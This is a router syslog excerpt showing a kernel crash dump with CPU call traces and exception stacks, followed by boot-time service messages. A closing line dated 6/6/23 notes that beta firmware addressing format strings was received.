May  5 01:05:02 crashlog: <4>7de0: d288f5e0 0000002d 10000000 000572a5 0000d978 00000000 14000000 00000000
May  5 01:05:02 crashlog: <4>7e00: 0004c520 00000000 00000018 00000000 b0000000 000561a7 ebd06574 0000002d
May  5 01:05:02 crashlog: <4>7e20: 3e8c3070 ffffffc0 3e8d7ec0 ffffffc0 0052e548 ffffffc0 00004a9e 00000000
May  5 01:05:02 crashlog: <4>7e40: 00000000 00000000 f6d33d78 00000000 f6d38920 00000000 00000000 00000000
May  5 01:05:02 crashlog: <4>7e60: 00185ff8 ffffffc0 00000000 00000000 00000000 00000000 d288f5e0 0000002d
May  5 01:05:02 crashlog: <4>7e80: 3ffe42f8 ffffffc0 00000001 00000000 00000001 00000000 d27e18dc 0000002d
May  5 01:05:02 crashlog: <4>7ea0: 3e8d4000 ffffffc0 007c2000 ffffffc0 006f5000 ffffffc0 3ffe42f8 ffffffc0
May  5 01:05:02 crashlog: <4>7ec0: 00731d90 ffffffc0 3e8d7f10 ffffffc0 00370ad4 ffffffc0 3e8d7f10 ffffffc0
May  5 01:05:02 crashlog: <4>7ee0: 00370adc ffffffc0 60000145 00000000
May  5 01:05:02 crashlog: <4>[<ffffffc000083f00>] el1_irq+0x80/0xf8
May  5 01:05:02 crashlog: <4>[<ffffffc000370be0>] cpuidle_enter+0x18/0x20
May  5 01:05:02 crashlog: <4>[<ffffffc0000c649c>] cpu_startup_entry+0x1ec/0x250
May  5 01:05:02 crashlog: <4>[<ffffffc00008d990>] secondary_start_kernel+0x150/0x178
May  5 01:05:02 crashlog: <2>CPU0: stopping
May  5 01:05:02 crashlog: <4>CPU: 0 PID: 0 Comm: swapper/0 Tainted: P           O    4.1.51 #4
May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
May  5 01:05:02 crashlog: <0>Call trace:
May  5 01:05:02 crashlog: <4>[<ffffffc000087658>] dump_backtrace+0x0/0x150
May  5 01:05:02 crashlog: <4>[<ffffffc0000877bc>] show_stack+0x14/0x20
May  5 01:05:02 crashlog: <4>[<ffffffc00051bd10>] dump_stack+0x90/0xb0
May  5 01:05:02 crashlog: <4>[<ffffffc00008df10>] handle_IPI+0x190/0x1a0
May  5 01:05:02 crashlog: <4>[<ffffffc000080c68>] gic_handle_irq+0x88/0x90
May  5 01:05:02 crashlog: <4>Exception stack(0xffffffc0006fbd70 to 0xffffffc0006fbea0)
May  5 01:05:02 crashlog: <4>bd60:                                     d288f5f4 0000002d 00000000 00000080
May  5 01:05:02 crashlog: <4>bd80: 006fbec0 ffffffc0 00370adc ffffffc0 d288f5f4 0000002d 24000000 000572a5
May  5 01:05:02 crashlog: <4>bda0: 0000d979 00000000 14000000 00000000 0004c520 00000000 00000018 00000000
May  5 01:05:02 crashlog: <4>bdc0: b0000000 000561a7 eba49b4c 0000002d 0070a9f0 ffffffc0 fffe6ce6 00000000
May  5 01:05:02 crashlog: <4>bde0: 00000002 00000000 ffcf0eec 00000000 00000000 00000000 ffcf0688 00000000
May  5 01:05:02 crashlog: <4>be00: 00013378 00000000 00000000 00000000 003f8ce0 ffffffc0 00000000 00000000
May  5 01:05:02 crashlog: <4>be20: 00000000 00000000 d288f5f4 0000002d 3ffb72f8 ffffffc0 00000001 00000000
May  5 01:05:02 crashlog: <4>be40: 00000001 00000000 d27731fc 0000002d 006f8000 ffffffc0 007c2000 ffffffc0
May  5 01:05:02 crashlog: <4>be60: 006f5000 ffffffc0 3ffb72f8 ffffffc0 00731d90 ffffffc0 006fbec0 ffffffc0
May  5 01:05:02 crashlog: <4>be80: 00370ad4 ffffffc0 006fbec0 ffffffc0 00370adc ffffffc0 60000145 00000000
May  5 01:05:02 crashlog: <4>[<ffffffc000083f00>] el1_irq+0x80/0xf8
May  5 01:05:02 crashlog: <4>[<ffffffc000370be0>] cpuidle_enter+0x18/0x20
May  5 01:05:02 crashlog: <4>[<ffffffc0000c649c>] cpu_startup_entry+0x1ec/0x250
May  5 01:05:02 crashlog: <4>[<ffffffc0005169b0>] rest_init+0x88/0x98
May  5 01:05:02 crashlog: <4>[<ffffffc0006be96c>] start_kernel+0x390/0x3a4
May  5 01:05:02 crashlog: <2>CPU2: stopping
May  5 01:05:02 crashlog: <4>CPU: 2 PID: 2961 Comm: hotplug Tainted: P           O    4.1.51 #4
May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
May  5 01:05:02 crashlog: <0>Call trace:
May  5 01:05:02 crashlog: <4>[<ffffffc000087658>] dump_backtrace+0x0/0x150
May  5 01:05:02 crashlog: <4>[<ffffffc0000877bc>] show_stack+0x14/0x20
May  5 01:05:02 crashlog: <4>[<ffffffc00051bd10>] dump_stack+0x90/0xb0
May  5 01:05:02 crashlog: <4>[<ffffffc00008df10>] handle_IPI+0x190/0x1a0
May  5 01:05:02 crashlog: <4>[<ffffffc000080c68>] gic_handle_irq+0x88/0x90
May  5 01:05:02 crashlog: <4>Exception stack(0xffffffc02b65f910 to 0xffffffc02b65fa40)
May  5 01:05:02 crashlog: <4>f900:                                     007d6000 ffffffc0 00000000 00000080
May  5 01:05:02 crashlog: <4>f920: 2b65fa60 ffffffc0 000cc020 ffffffc0 00400008 00000000 2b65c000 ffffffc0
May  5 01:05:02 crashlog: <4>f940: 00008640 ffffff80 00395730 ffffffc0 00000007 00000000 00000003 00000000
May  5 01:05:02 crashlog: <4>f960: 00395638 ffffffc0 006ff980 ffffffc0 00000006 00000000 007d6b40 ffffffc0
May  5 01:05:02 crashlog: <4>f980: 00000286 00000000 00000000 00000000 00000006 00000000 f6e4ae18 00000000
May  5 01:05:02 crashlog: <4>f9a0: f6e4b920 00000000 00000000 00000000 000f5610 ffffffc0 00000000 00000000
May  5 01:05:02 crashlog: <4>f9c0: 00000000 00000000 007d6000 ffffffc0 00710000 ffffffc0 007d367c ffffffc0
May  5 01:05:02 crashlog: <4>f9e0: 00000140 00000000 00000001 00000000 00000021 00000000 006fe000 ffffffc0
May  5 01:05:02 crashlog: <4>fa00: 007c6c40 ffffffc0 fffe6cf1 00000000 00000004 00000000 2b65fa60 ffffffc0
May  5 01:05:02 crashlog: <4>fa20: 000cc01c ffffffc0 2b65fa60 ffffffc0 000cc020 ffffffc0 60000145 00000000
May  5 01:05:02 crashlog: <4>[<ffffffc000083f00>] el1_irq+0x80/0xf8
May  5 01:05:02 crashlog: <4>[<ffffffc0000cc9f0>] console_device+0x70/0x80
May  5 01:05:02 crashlog: <4>[<ffffffc00030b1c4>] tty_open+0x29c/0x510
May  5 01:05:02 crashlog: <4>[<ffffffc000142468>] chrdev_open+0x98/0x198
May  5 01:05:02 crashlog: <4>[<ffffffc00013be94>] do_dentry_open.isra.1+0x1c4/0x2f0
May  5 01:05:02 crashlog: <4>[<ffffffc00013cdd0>] vfs_open+0x50/0x60
May  5 01:05:02 crashlog: <4>[<ffffffc00014ba2c>] do_last.isra.13+0x2dc/0xc20
May  5 01:05:02 crashlog: <4>[<ffffffc00014c3f4>] path_openat+0x84/0x5c0
May  5 01:05:02 crashlog: <4>[<ffffffc00014da28>] do_filp_open+0x30/0x98
May  5 01:05:02 crashlog: <4>[<ffffffc00013d1e0>] do_sys_open+0x148/0x230
May  5 01:05:02 crashlog: <4>[<ffffffc000185dcc>] compat_SyS_openat+0xc/0x18
May  5 01:05:02 crashlog: 
May  5 01:05:02 crashlog: 
May  5 01:05:02 crashlog: 
May  5 01:05:02 crashlog: 
May  5 01:05:02 crashlog: 
May  5 01:05:02 kernel: ^[[0;33;41m[ERROR pktrunner] runnerUcast_inet6addr_event,187: Could not rdpa_system_ipv6_host_address_table_find ret=-5^[[0m
May  5 01:05:02 kernel: port_generic_open 536 skip turnning on power on eth0 here
May  5 01:05:02 kernel: IGMP Query send failed
May  5 01:05:02 kernel: IGMP Query send failed
May  5 01:05:02 kernel: eth5 (Ext switch port: 7) (Logical Port: 15) (phyId: 1e) Link UP at 1000 mbps full duplex
May  5 01:05:02 kernel: <=== Deactivate Deep Green Mode
May  5 01:05:04 rc_service: service 1076:notify_rc restart_firewall
May  5 01:05:04 acsd: eth6: Selecting 2g band ACS policy
May  5 01:05:04 wlceventd: main(1074): wlceventd Start...
May  5 01:05:04 RT-AX88U: start httpd:80
May  5 01:05:04 avahi-daemon[1134]: WARNING: No NSS support for mDNS detected, consider installing nss-mdns!
May  5 01:05:04 httpd: Save SSL certificate...80
May  5 01:05:04 httpd: mssl_cert_key_match : PASS
May  5 01:05:05 disk monitor: be idle
May  5 01:05:05 jffs2: valid logs(1)
May  5 01:05:05 Mastiff: init
```


6/6/23

Beta Firmware Received, format strings are addressed.